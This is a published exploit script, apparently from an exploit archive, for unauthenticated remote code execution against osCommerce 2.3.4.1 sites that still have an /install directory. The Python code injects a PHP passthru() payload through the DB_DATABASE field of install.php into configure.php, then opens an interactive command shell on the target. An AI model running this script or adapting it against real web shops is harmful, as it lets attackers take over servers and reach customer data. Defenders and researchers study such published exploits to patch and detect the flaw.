# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Vendor Homepage: https://www.oscommerce.com/
# Version: osCommerce 2.3.4
# Tested on: Windows

import requests
import sys

if(len(sys.argv) != 2):
	print("please specify the osCommerce url")
	print("format: python3 osCommerce2_3_4RCE.py <url>")
	print("eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog")
	sys.exit(0)

baseUrl = sys.argv[1]
testVulnUrl = baseUrl + '/install/install.php'

def rce(command):
	#targeting the finish step which is step 4
	targetUrl = baseUrl + '/install/install.php?step=4'

	payload = "');"
	payload += "passthru('" + command + "');"    # injecting system command here
	payload += "/*"

	#injecting parameter
	data = {
		'DIR_FS_DOCUMENT_ROOT': './',
		'DB_DATABASE' : payload
	}

	response = requests.post(targetUrl, data=data)

	if(response.status_code == 200):
		#print('[*] Successfully injected payload to config file')

		readCMDUrl = baseUrl + '/install/includes/configure.php'
		cmd = requests.get(readCMDUrl)

		commandRsl = cmd.text.split('\n')

		if(cmd.status_code == 200):
			#print('[*] System Command Execution Completed')
			#removing the error message above
			for i in range(2, len(commandRsl)):
				print(commandRsl[i])
		else:
			return '[!] Configure.php not found'


	else:
		return '[!] Fail to inject payload'



#testing vulnerability accessing the directory
test = requests.get(testVulnUrl)

#checking the install directory still exist or able to access or not
if(test.status_code == 200):
	print('[*] Install directory still available, the host likely vulnerable to the exploit.')

	#testing system command injection
	print('[*] Testing injecting system command to test vulnerability')
	cmd = 'whoami'

	print('User: ', end='')
	err = rce(cmd)

	if(err != None):
		print(err)
		sys.exit(0)

	while(True):
		cmd = input('RCE_SHELL$ ')
		err = rce(cmd)

		if(err != None):
			print(err)
			sys.exit(0)

else:
	print('[!] Install directory not found, the host is not vulnerable')
	sys.exit(0)